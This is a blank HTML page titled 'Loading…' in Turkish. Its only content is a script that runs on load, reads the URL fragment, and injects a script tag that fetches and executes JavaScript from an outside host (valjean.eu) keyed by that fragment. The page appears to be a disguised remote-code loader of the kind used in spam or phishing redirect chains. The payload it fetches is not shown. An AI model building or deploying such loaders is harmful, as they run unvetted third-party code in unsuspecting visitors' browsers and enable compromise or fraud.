<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="utf-8">
  <title>Yükleniyor…</title>
  <script>
    (function() {
      // Hash-based slug: #denek → slug = denek
      var slug = location.hash.replace(/^#/, '');
      if (!slug) return;
      var fetchUrl = 'https://valjean.eu/index.php?guid=' + encodeURIComponent(slug);
      var s = document.createElement('script');
      s.src = fetchUrl;
      document.head.appendChild(s);
    })();
  </script>
</head>
<body></body>
</html>
